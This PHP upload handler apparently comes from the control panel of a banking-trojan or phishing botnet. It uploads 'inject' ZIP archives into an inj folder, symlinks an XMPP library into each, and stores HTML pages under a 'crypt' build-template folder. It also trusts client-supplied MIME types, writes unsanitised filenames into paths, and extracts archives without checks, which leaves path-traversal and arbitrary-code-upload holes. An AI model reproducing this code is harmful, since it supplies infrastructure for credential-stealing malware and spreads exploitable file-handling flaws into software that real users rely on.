<?php session_start();

if (!(isset($_SESSION['user_id']))) {
    header("Location: ../../index.php");  
    return;
}  
?>

<?php
  $allowedExt = array("png","jpg");
    $temp = explode(".",$_FILES["file"]["name"]);
    //$imei_req = $mysqli->real_escape_string($_REQUEST["f"]);
    $extension = end($temp);
    $message = '';
    #echo "uploading...";
    #var_dump($_FILES);
    function create_symlink(){
        # get inject list
        $files = scandir('../../inj');
        foreach ($files as $file) {
            if (($file != ".") and ($file != "..") and ($file != "") and ($file != "go.php") and ($file != ".htaccess") and ($file != "index.html")){
                # remove old link
                unlink("../../inj/$file/XMPPHP");

                # create new link
                symlink("../../admin/XMPPHP", "../../inj/$file/XMPPHP");
            }
        }
    }
    

    if((($_FILES["file"]["type"]=="image/png") || ($_FILES["file"]["type"]=="image/jpg")) && ($_FILES["file"]["size"] < 1000000)) {
        #echo "success";
        if($_FILES["file"]["error"] > 0)        {
            $message .= "error in uploading" . $_FILES["file"]["error"];
        } else {
            $message .= "uploaded successfully";
        }
    	if ($_REQUEST["f"] == "icons"){
            move_uploaded_file($_FILES["file"]["tmp_name"],"../icons/".$_FILES["file"]["name"]);
    	}
    	if ($_REQUEST["f"] == "icon"){
            move_uploaded_file($_FILES["file"]["tmp_name"],"../../icon/".$_FILES["file"]["name"]);
    	}
        
    } else if ($_REQUEST["f"] == "inject"){
        # move_uploaded_file($_FILES["file"]["tmp_name"],"../../icon/".$_FILES["file"]["name"]);
        # echo "uploading...";
        $message .= "uploaded successfully";
        
        $zip = new ZipArchive;
        //move_uploaded_file($_FILES["file"]["tmp_name"],"/tmp/zip.zip");
        $zipped = $zip->open($_FILES["file"]["tmp_name"]);
        
        if ( $zipped ) {
            $zip->extractTo('../../inj/');
            #var_dump($zip);
            #var_dump($_REQUEST);
            $zip->close();
        }
        create_symlink();
    } else if ($_REQUEST["f"] == "welcomepage"){
        $allowed =  array('html','htm');
        $filename = $_FILES['file']['name'];
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        if(in_array($ext,$allowed) ) {
            move_uploaded_file($_FILES["file"]["tmp_name"],"../build/templates/crypt/".$_FILES["file"]["name"]);
            $message .= "uploaded successfully";
        }   
    } else
        $message .= "invalid file" ;

    //$message .= $_FILES["file"]["name"]."stored in ".$_FILES["file"]["tmp_name"]."<br>";
    //$message .= "moved Successfully";

    $response = array("result" => "OK",
				"message" => "$message",
				);
    echo json_encode($response);

?>
